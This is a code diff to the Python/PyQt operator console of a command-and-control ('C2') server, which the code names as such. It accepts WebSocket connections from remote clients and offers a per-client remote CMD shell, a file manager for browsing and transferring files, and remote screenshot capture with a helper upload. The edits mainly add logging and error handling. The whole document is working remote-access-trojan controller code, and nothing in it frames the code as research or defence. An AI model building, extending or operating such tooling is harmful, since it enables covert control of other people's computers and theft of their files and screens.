+            log_console("[截屏] 保存失败：无数据")
             return
-        save_path, _ = QFileDialog.getSaveFileName(self, "保存截图", "screenshot.jpg",
-                                                   "JPEG (*.jpg *.jpeg)")
+        save_path, _ = QFileDialog.getSaveFileName(
+            self, "保存截图", "screenshot.png", "PNG (*.png);;JPEG (*.jpg *.jpeg)")
         if not save_path:
+            log_console("[截屏] 保存取消")
             return
         try:
             with open(save_path, "wb") as f:
-                f.write(self._buf)
-            self.log(f"已保存到 {save_path}")
+                f.write(self._plain)
+            log_console(f"[截屏] 已保存 {save_path} ({len(self._plain)} 字节)")
         except OSError as e:
-            self.log(f"保存失败: {e}")
+            log_console(f"[截屏] 保存失败: {e}")
 
     def log(self, msg):
         self.log_box.append(msg)
@@ -1163,7 +1268,7 @@ class ScreenPreviewDialog(QDialog):
         if self.main_window and self.client in self.main_window.open_screen_dialogs:
             if self.main_window.open_screen_dialogs[self.client] is self:
                 del self.main_window.open_screen_dialogs[self.client]
-        log_console(f"截屏窗口关闭: {self.client.display_name}")
+        log_console(f"[截屏] 关闭窗口 {self.client.display_name}")
         super().closeEvent(event)
 
 
@@ -1251,13 +1356,13 @@ class MainWindow(QMainWindow):
         self.ping_timer.timeout.connect(self.broadcast_ping)
 
         self.apply_theme(False)
-        log_console("C2 启动，等待开始监听")
+        log_console("[C2] 启动，等待监听")
 
     def choose_color(self):
         color = QColorDialog.getColor(QColor(self.fg_color), self, "选择字体颜色")
         if color.isValid():
             self.fg_color = color.name()
-            log_console(f"字体颜色改为: {self.fg_color}")
+            log_console(f"[C2] 字体颜色 -> {self.fg_color}")
             self.apply_theme(self.is_dark_mode)
 
     def apply_theme(self, dark: bool):
@@ -1268,6 +1373,7 @@ class MainWindow(QMainWindow):
                 QMainWindow {{ background-color: {DARK_BG}; }}
                 QWidget {{ background-color: {DARK_BG}; color: {fg}; }}
                 QLabel {{ color: {fg}; }}
+                QCheckBox {{ color: {fg}; }}
                 QLineEdit {{
                     background-color: {DARK_BG};
                     color: {fg};
@@ -1391,7 +1497,7 @@ class MainWindow(QMainWindow):
                 sess.send_packet(b"PING")
                 n += 1
         if n:
-            log_console(f"广播 PING 给 {n} 个客户端")
+            log_console(f"[C2] 广播 PING 给 {n} 个客户端")
         next_ms = random.randint(8000, 13000)
         self.ping_timer.start(next_ms)
 
@@ -1399,10 +1505,10 @@ class MainWindow(QMainWindow):
         while self.server_running:
             try:
                 raw_conn, addr = self.server_sock.accept()
-                log_console(f"收到新 TCP 连接: {addr}")
+                log_console(f"[C2] 新 TCP 连接 {addr}")
                 ok, ip, country, display_name = ws_handle_http_upgrade(raw_conn)
                 if not ok:
-                    log_console(f"WebSocket握手失败 {addr}")
+                    log_console(f"[C2] 握手失败 {addr}")
                     raw_conn.close(); continue
                 if not ip: ip = addr[0]
                 if not country: country = "XX"
@@ -1413,7 +1519,6 @@ class MainWindow(QMainWindow):
                 sess.signals.on_fs.connect(self.handle_session_fs)
                 sess.signals.on_screen.connect(self.handle_session_screen)
                 sess.signals.on_mode.connect(self.handle_session_mode)
-                sess.signals.on_skey.connect(self.handle_session_skey)
                 sess.signals.on_helper_needed.connect(self.handle_helper_needed)
                 sess.signals.on_helper_ack.connect(self.handle_helper_ack)
                 sess.signals.on_helper_ready.connect(self.handle_helper_ready)
@@ -1424,7 +1529,8 @@ class MainWindow(QMainWindow):
             except OSError:
                 break
             except Exception as e:
-                log_console(f"accept_loop 异常: {e}")
+                log_console(f"[C2] accept_loop 异常: {e}")
+                traceback.print_exc()
                 break
 
     @pyqtSlot(object, str)
@@ -1447,16 +1553,17 @@ class MainWindow(QMainWindow):
     @pyqtSlot(object)
     def handle_session_mode(self, sess):
         self.client_model.dataChanged.emit(QModelIndex(), QModelIndex())
-
-    @pyqtSlot(object)
-    def handle_session_skey(self, sess):
-        log_console(f"[SKEY] 收到 {sess.display_name} 的截图密钥")
+        dlg = self.open_screen_dialogs.get(sess)
+        if dlg is not None and not dlg._closing:
+            dlg._update_mode_label()
 
     @pyqtSlot(object)
     def handle_helper_needed(self, sess):
         dlg = self.open_screen_dialogs.get(sess)
         if dlg is not None and not dlg._closing:
             dlg.on_helper_needed()
+        else:
+            log_console(f"[HNED] {sess.display_name} 但截屏窗口未打开，忽略")
 
     @pyqtSlot(object, bytes)
     def handle_helper_ack(self, sess, offset):
@@ -1469,6 +1576,8 @@ class MainWindow(QMainWindow):
         dlg = self.open_screen_dialogs.get(sess)
         if dlg is not None and not dlg._closing:
             dlg.on_helper_ready()
+        else:
+            log_console(f"[HOK1] {sess.display_name} 但截屏窗口未打开，忽略")
 
     @pyqtSlot(object, str)
     def handle_helper_err(self, sess, msg):
@@ -1478,7 +1587,7 @@ class MainWindow(QMainWindow):
 
     @pyqtSlot(object)
     def handle_session_disconnect(self, sess):
-        log_console(f"[断开] {sess.display_name}")
+        log_console(f"[C2] 断开 {sess.display_name}")
         if sess in self.open_cmd_dialogs:
             dlg = self.open_cmd_dialogs.pop(sess)
             dlg.append_text("\n[!] WebSocket连接已经断开")
@@ -1495,16 +1604,15 @@ class MainWindow(QMainWindow):
             self.client_model.remove_by_obj(sess)
         except ValueError:
             pass
-        self.log(f"[断开] {sess.display_name}")
 
     def client_recv_loop(self, sess):
         buf = sess._recv_buf
-        log_console(f"接收线程启动: {sess.display_name}")
+        log_console(f"[C2] 接收线程启动 {sess.display_name}")
         while sess.connected:
             try:
                 chunk = sess.conn.recv(65536)
                 if not chunk:
-                    log_console(f"recv 返回空: {sess.display_name}")
+                    log_console(f"[C2] recv 返回空 {sess.display_name}")
                     break
                 buf.extend(chunk)
                 while True:
@@ -1516,11 +1624,13 @@ class MainWindow(QMainWindow):
                         pong = ws_build_server_frame(True, WS_OP_PONG, payload)
                         with sess._send_lock:
                             sess.conn.sendall(pong)
+                        log_console(f"[C2] 回 PONG 给 {sess.display_name}")
                         continue
                     elif opcode == WS_OP_PONG:
+                        log_console(f"[C2] 收到 PONG {sess.display_name}")
                         continue
                     elif opcode == WS_OP_CLOSE:
-                        log_console(f"收到 CLOSE 帧: {sess.display_name}")
+                        log_console(f"[C2] 收到 CLOSE {sess.display_name}")
                         break
                     elif opcode == WS_OP_TEXT:
                         continue
@@ -1538,91 +1648,103 @@ class MainWindow(QMainWindow):
                                     body = full_body[4:4+body_len]
                                     if len(body) >= 4:
                                         cmd_code = body[0:4]
+                                        log_console(f"[C2] 收到 {sess.display_name} "
+                                                    f"cmd={cmd_code!r} len={len(body)}")
                                         self._dispatch_packet(sess, cmd_code, body)
+                                    else:
+                                        log_console(f"[C2] {sess.display_name} body 过短")
                                 else:
-                                    log_console(f"[WS] 帧不完整: 需要 {4+body_len}, 实际 {len(full_body)}")
+                                    log_console(f"[C2] {sess.display_name} WS 帧不完整 "
+                                                f"需要 {4+body_len} 实际 {len(full_body)}")
+                            else:
+                                log_console(f"[C2] {sess.display_name} 全帧过短 {len(full_body)}")
             except (OSError, ConnectionResetError) as e:
-                log_console(f"recv 异常: {sess.display_name} {e}")
+                log_console(f"[C2] recv 异常 {sess.display_name}: {e}")
                 break
-        log_console(f"接收线程退出: {sess.display_name}")
+            except Exception as e:
+                log_console(f"[C2] recv 未知异常 {sess.display_name}: {e}")
+                traceback.print_exc()
+                break
+        log_console(f"[C2] 接收线程退出 {sess.display_name}")
         sess.close()
         sess.signals.on_disconnect.emit(sess)
 
     def _dispatch_packet(self, sess, cmd_code, body):
-        if cmd_code == b"PONG":
-            sess.last_pong = datetime.now()
-            self.client_model.dataChanged.emit(QModelIndex(), QModelIndex())
-        elif cmd_code == b"OUTP":
-            out_text = body[4:].decode("gbk", errors="replace")
-            sess.signals.on_outp.emit(sess, out_text)
-        elif cmd_code in (b"FDRV", b"FDIR", b"FMET", b"FDAT",
-                          b"FPRO", b"FDON", b"FACK", b"FOK0", b"FERR"):
-            sess.signals.on_fs.emit(sess, body)
-        elif cmd_code in (b"SCRM", b"SCRV", b"SCRD", b"SCRX"):
-            sess.signals.on_screen.emit(sess, body)
-        elif cmd_code == b"MODE":
-            if len(body) >= 5:
-                sess.is_service_mode = (body[4] == 0x01)
-                sess.signals.on_mode.emit(sess)
-                mode_str = "服务" if sess.is_service_mode else "桌面"
-                log_console(f"[MODE] {sess.display_name} -> {mode_str}")
-        elif cmd_code == b"SKEY":
-            if len(body) >= 36:
-                sess.shot_key = body[4:36]
-                sess.signals.on_skey.emit(sess)
-                log_console(f"[SKEY] {sess.display_name} 密钥已保存")
-        elif cmd_code == b"HNED":
-            log_console(f"[HNED] {sess.display_name} 需要 helper")
-            sess.signals.on_helper_needed.emit(sess)
-        elif cmd_code == b"HACK":
-            if len(body) >= 12:
-                offset = body[4:12]
-                sess.signals.on_helper_ack.emit(sess, offset)
-        elif cmd_code == b"HOK0":
-            dlg = self.open_screen_dialogs.get(sess)
-            if dlg is not None:
-                if dlg._helper_waiting_hok0_for_start:
-                    log_console(f"[HOK0] {sess.display_name} 文件已创建，开始发数据")
-                    dlg.on_helper_hok0_start()
-                elif dlg._helper_waiting_hok0_for_done:
-                    log_console(f"[HOK0] {sess.display_name} 上传完成")
-                    dlg.on_helper_hok0_done()
+        try:
+            if cmd_code == b"PONG":
+                sess.last_pong = datetime.now()
+                self.client_model.dataChanged.emit(QModelIndex(), QModelIndex())
+            elif cmd_code == b"OUTP":
+                out_text = body[4:].decode("gbk", errors="replace")
+                sess.signals.on_outp.emit(sess, out_text)
+            elif cmd_code in (b"FDRV", b"FDIR", b"FMET", b"FDAT",
+                              b"FPRO", b"FDON", b"FACK", b"FOK0", b"FERR"):
+                sess.signals.on_fs.emit(sess, body)
+            elif cmd_code in (b"SCRM", b"SCRV", b"SCRD", b"SCRX"):
+                sess.signals.on_screen.emit(sess, body)
+            elif cmd_code == b"MODE":
+                if len(body) >= 5:
+                    sess.is_service_mode = (body[4] == 0x01)
+                    sess.signals.on_mode.emit(sess)
+                    log_console(f"[MODE] {sess.display_name} -> "
+                                f"{'服务' if sess.is_service_mode else '桌面'}")
+            elif cmd_code == b"HNED":
+                log_console(f"[HNED] {sess.display_name}")
+                sess.signals.on_helper_needed.emit(sess)
+            elif cmd_code == b"HACK":
+                if len(body) >= 12:
+                    offset = body[4:12]
+                    sess.signals.on_helper_ack.emit(sess, offset)
+            elif cmd_code == b"HOK0":
+                dlg = self.open_screen_dialogs.get(sess)
+                if dlg is not None:
+                    if dlg._helper_waiting_hok0_for_start:
+                        log_console(f"[HOK0] {sess.display_name} 开始发数据")
+                        dlg.on_helper_hok0_start()
+                    elif dlg._helper_waiting_hok0_for_done:
+                        log_console(f"[HOK0] {sess.display_name} 上传完成")
+                        dlg.on_helper_hok0_done()
+                    else:
+                        log_console(f"[HOK0] {sess.display_name} 状态异常，忽略")
                 else:
-                    log_console(f"[HOK0] {sess.display_name} 状态异常，忽略")
-        elif cmd_code == b"HOK1":
-            log_console(f"[HOK1] {sess.display_name} helper 就绪")
-            sess.signals.on_helper_ready.emit(sess)
-        elif cmd_code == b"HERR":
-            msg = body[4:].decode("gbk", errors="replace") if len(body) > 4 else "unknown"
-            log_console(f"[HERR] {sess.display_name}: {msg}")
-            sess.signals.on_helper_err.emit(sess, msg)
-        else:
-            log_console(f"收到未知命令: {cmd_code!r}, len={len(body)}")
+                    log_console(f"[HOK0] {sess.display_name} 无截屏窗口，忽略")
+            elif cmd_code == b"HOK1":
+                log_console(f"[HOK1] {sess.display_name}")
+                sess.signals.on_helper_ready.emit(sess)
+            elif cmd_code == b"HERR":
+                msg = body[4:].decode("gbk", errors="replace") if len(body) > 4 else "unknown"
+                log_console(f"[HERR] {sess.display_name}: {msg}")
+                sess.signals.on_helper_err.emit(sess, msg)
+            else:
+                log_console(f"[C2] 未知命令 {cmd_code!r} len={len(body)}")
+        except Exception as e:
+            log_console(f"[C2] _dispatch_packet 异常: {e}")
+            traceback.print_exc()
 
     def start_server(self):
         try:
             port = int(self.port_edit.text())
         except ValueError:
-            log_console("端口号不合法")
+            log_console("[C2] 端口不合法")
             return
-        log_console(f"启动监听 127.0.0.1:{port}")
+        log_console(f"[C2] 启动监听 127.0.0.1:{port}")
         try:
             self.server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             self.server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
             self.server_sock.bind(("127.0.0.1", port))
             self.server_sock.listen(8)
         except OSError as e:
-            log_console(f"监听失败: {e}")
+            log_console(f"[C2] 监听失败: {e}")
             return
         self.server_running = True
         threading.Thread(target=self.accept_loop, daemon=True).start()
         self.ping_timer.start(random.randint(8000, 13000))
         self.btn_start.setEnabled(False)
         self.btn_stop.setEnabled(True)
-        self.log(f"启动 Cloudflared Tunnel 模式，监听 127.0.0.1:{port}")
+        self.log(f"启动监听 127.0.0.1:{port}")
 
     def stop_server(self):
-        log_console("停止监听")
+        log_console("[C2] 停止监听")
         self.ping_timer.stop()
         self.server_running = False
         if self.server_sock:
@@ -1647,6 +1769,7 @@ class MainWindow(QMainWindow):
         act_screen = menu.addAction("屏幕截图")
         ret = menu.exec(self.view.viewport().mapToGlobal(pos))
         if ret == act_cmd:
+            log_console(f"[C2] 打开 CMD 会话 {sess.display_name}")
             if sess in self.open_cmd_dialogs:
                 dlg = self.open_cmd_dialogs[sess]
                 if dlg.isVisible():
@@ -1658,6 +1781,7 @@ class MainWindow(QMainWindow):
             self.open_cmd_dialogs[sess] = dlg
             dlg.show()
         elif ret == act_file:
+            log_console(f"[C2] 打开文件管理 {sess.display_name}")
             if sess in self.open_file_dialogs:
                 dlg = self.open_file_dialogs[sess]
                 if dlg.isVisible():
@@ -1670,6 +1794,7 @@ class MainWindow(QMainWindow):
             self.open_file_dialogs[sess] = dlg
             dlg.show()
         elif ret == act_screen:
+            log_console(f"[C2] 打开截屏窗口 {sess.display_name}")
             if sess in self.open_screen_dialogs:
                 dlg = self.open_screen_dialogs[sess]
                 if dlg.isVisible():
@@ -1683,7 +1808,7 @@ class MainWindow(QMainWindow):
             dlg.show()
 
     def closeEvent(self, event):
-        log_console("C2 关闭")
+        log_console("[C2] 关闭")
         self.stop_server()
         event.accept()
 
